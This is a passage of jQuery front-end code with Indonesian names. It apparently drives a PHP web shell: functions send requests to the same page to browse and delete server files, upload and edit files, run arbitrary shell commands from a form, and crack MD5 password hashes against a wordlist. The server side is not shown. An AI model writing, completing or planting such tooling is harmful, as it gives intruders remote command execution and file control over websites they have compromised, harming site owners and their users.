// Saat tombol folder diklik
    $('#file-man').on('click', '#folder, #separator', function() {
        
      var path = $(this).data('path');
      $.ajax({
        type: 'POST',
        url: '',
        data: {aksi: 'simpan_path', path: path},
      });
      //console.log(path);
      loadFolder(path);
    });



    // Buka Folder dengan ajax
    function loadFolder(path) {
      $.ajax({
        type: 'POST',
        url: '',
        data: {aksi: 'buka_folder', path: path},
        beforeSend: function() {
          $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
        },
        success: function(data) {
          //console.log(data);
          $('#file-man').html(data);
          $('#link-dir').load(location.href + " #link-dir");
          window.history.replaceState({path: path}, '', '?dir=' + path);
        }
      });
    }


      // Fungsi hapus file/folder
      function hapus(nama_file) {
        $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
          $.ajax({
            type: 'POST',
            url: '',
            data: 'aksi=hapus_file&nama_file=' + nama_file,
            success: function(data) {
              $('#konten').html(data);
              reloadPage();
            }
          });
      }

      // Fungsi download
      function dl(nama_file) {
      window.location.href = '?dl=' + nama_file;
      }

     // Fungsi edit file
      function edit_file(nama_file) {
        //$('#form_edit').show();
        $.ajax({
          type: 'POST',
          url: '',
          data: 'aksi=edit_file&nama_file=' + nama_file,
          success: function(data) {
            $('#konten').html(data);
          }
        });
      }

    function kirimForm() {
      var formData = $('#form_edit_file').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData,
        beforeSend: function() {
          $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
        },
        success: function(data) {
        $('#konten').html(data);
        //$('#form_edit').hide();
        reloadPage();
        }
      });
    }

    $('#form_upload_file').submit(function(e) {
      e.preventDefault();
      var file = $('#file')[0].files[0];
      var formData = new FormData();
      formData.append('file', file);
      formData.append('aksi', 'upload_file');

      $.ajax({
        type: 'POST',
        url: '',
        data: formData,
        contentType: false,
        processData: false,
        beforeSend: function() {
          $('#status-upload').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
        },
        success: function(data) {
          $('#status-upload').html(data);
          reloadPage();

        }
      });
    });

    $('#form_buat_file').submit(function(e) {
        e.preventDefault();
        var formData = $(this).serialize();
          $.ajax({
            type: 'POST',
            url: '',
            data: formData + '&aksi=buat_file',
            beforeSend: function() {
              $('#status-nf').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
            },
            success: function(data) {
              $('#status-nf').html(data);
              reloadPage();
            }
          });
      });

    $('#form_buat_folder').submit(function(e) {
        e.preventDefault();
        var formData = $(this).serialize();
          $.ajax({
            type: 'POST',
            url: '',
            data: formData + '&aksi=buat_folder',
            beforeSend: function() {
              $('#status-nd').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
            },
            success: function(data) {
              $('#status-nd').html(data);
              reloadPage();
            }
          });
      });

    function kirimcmd() {
      var formData = $('#command').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=cmmd',
        beforeSend: function() {
          $('#cmd_output').html('Please wait...');
        },
        success: function(data) {
        $('#cmd_output').html(data);
        }
      });
    }

    function text2md5() {
      var formData = $('#passtext').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=text2md5_',
        beforeSend: function() {
          $('#output').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
        },
        success: function(data) {
        $('#output').html(data);
        }
      });
    }

    function deMD5() {
      var formData = $('#passlist, #md5pass').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=decmd5',
        beforeSend: function() {
          $('#cracked').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
        },
        success: function(data) {
        $('#cracked').html(data);
        }
      });
    }

    // Buka Menu dengan ajax
    function bukaMenu(menu) {
      $.ajax({
        type: 'POST',
        url: '',
        data: {aksi: menu},
        beforeSend: function() {
          $('#konten').html('<div class="progress progress-striped active"><div class="progress-bar progress-bar-inverse" style="width: 100%"></div></div>');
        },
        success: function(data) {
          $('#file-man').html(data);
          $('#link-dir').load(location.href + " #link-dir");
          window.history.replaceState({menu: menu}, '', '?menu=' + menu);
        },
        error: function(xhr, status, error) {
          console.log('Error: ' + error);
        }

      });
    }

    function reloadPage(){
      setTimeout(function() {
              window.location.reload();
              }, 1000);
    }
